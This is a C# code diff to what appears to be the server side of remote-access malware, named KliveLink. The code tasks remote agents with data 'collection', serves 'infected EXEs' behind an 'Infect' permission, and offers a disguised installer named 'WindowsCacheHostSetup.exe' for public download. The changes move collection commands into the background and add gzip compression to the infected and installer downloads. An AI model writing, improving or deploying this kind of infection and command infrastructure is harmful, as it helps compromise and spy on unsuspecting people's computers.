@@ -1,4 +1,5 @@
-﻿using System.Net;
+﻿using System.IO.Compression;
+using System.Net;
 using System.Net.WebSockets;
 using System.Text;
 using System.Text.Json;
@@ -272,8 +273,29 @@ public sealed class KliveLinkV2Routes
                         : Array.Empty<string>(),
                 };
                 string actor = req.user?.Name ?? req.user?.UserID ?? "unknown";
-                V2Result result = await _parent.Server.SendCommandAsync(agentId, V2CommandOperation.StartCollection, request, 600_000, actor);
-                await req.ReturnResponse(JsonConvert.SerializeObject(result), "application/json");
+                _ = Task.Run(async () =>
+                {
+                    try
+                    {
+                        V2Result result = await _parent.Server.SendCommandAsync(
+                            agentId, V2CommandOperation.StartCollection, request, 600_000, actor);
+                        if (result.Status != V2CommandStatus.Ok)
+                            await _parent.LogErrorAsync(
+                                new Exception($"Collection {request.Tier} failed: {result.Error}"),
+                                $"KliveLink collection {agentId}");
+                    }
+                    catch (Exception ex)
+                    {
+                        await _parent.LogErrorAsync(ex, $"KliveLink collection {agentId}");
+                    }
+                });
+                await req.ReturnResponse(JsonConvert.SerializeObject(new
+                {
+                    started = true,
+                    agentId,
+                    tier = request.Tier.ToString(),
+                    profile = request.Profile,
+                }), "application/json");
             }
             catch (Exception ex)
             {
@@ -384,7 +406,8 @@ public sealed class KliveLinkV2Routes
                 {
                     { "Content-Disposition", $"attachment; filename=\"{outputName}\"" }
                 };
-                await req.ReturnBinaryResponse(memory.ToArray(), "application/octet-stream", headers: headers);
+                byte[] body = MaybeGzip(req, memory.ToArray(), headers);
+                await req.ReturnBinaryResponse(body, "application/octet-stream", headers: headers);
             }
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Post, KliveLinkPerms.Infect, 250L * 1024 * 1024);
@@ -400,7 +423,7 @@ public sealed class KliveLinkV2Routes
                 {
                     { "Content-Disposition", "attachment; filename=\"WindowsCacheHostSetup.exe\"" }
                 };
-                await req.ReturnBinaryResponse(bytes, "application/octet-stream", headers: headers);
+                await req.ReturnBinaryResponse(MaybeGzip(req, bytes, headers), "application/octet-stream", headers: headers);
             }
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Get, Perms.Public);
@@ -416,7 +439,7 @@ public sealed class KliveLinkV2Routes
                 {
                     { "Content-Disposition", "attachment; filename=\"WindowsCacheHostSetup.exe\"" }
                 };
-                await req.ReturnBinaryResponse(bytes, "application/octet-stream", headers: headers);
+                await req.ReturnBinaryResponse(MaybeGzip(req, bytes, headers), "application/octet-stream", headers: headers);
             }
             catch (Exception ex) { await Fail(req, ex); }
         }, HttpMethod.Get, Perms.Public);
@@ -620,6 +643,32 @@ public sealed class KliveLinkV2Routes
 
     private static async Task Fail(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, Exception ex)
         => await req.ReturnResponse(JsonConvert.SerializeObject(new { error = ex.Message }), "application/json", null, HttpStatusCode.InternalServerError);
+
+    /// <summary>
+    /// Binary downloads (installers and infected EXEs) are large and mostly compressible.
+    /// Browsers and fetch() transparently decode Content-Encoding: gzip.
+    /// </summary>
+    private static byte[] MaybeGzip(Omnipotent.Services.KliveAPI.KliveAPI.UserRequest req, byte[] data,
+        System.Collections.Specialized.NameValueCollection headers)
+    {
+        try
+        {
+            string? accept = req.req?.Headers["Accept-Encoding"];
+            if (string.IsNullOrWhiteSpace(accept) ||
+                !accept.Contains("gzip", StringComparison.OrdinalIgnoreCase))
+                return data;
+            using var memory = new MemoryStream();
+            using (var gzip = new GZipStream(memory, CompressionLevel.Fastest, leaveOpen: true))
+                gzip.Write(data, 0, data.Length);
+            headers["Content-Encoding"] = "gzip";
+            return memory.ToArray();
+        }
+        catch
+        {
+            headers.Remove("Content-Encoding");
+            return data;
+        }
+    }
 }
 
 
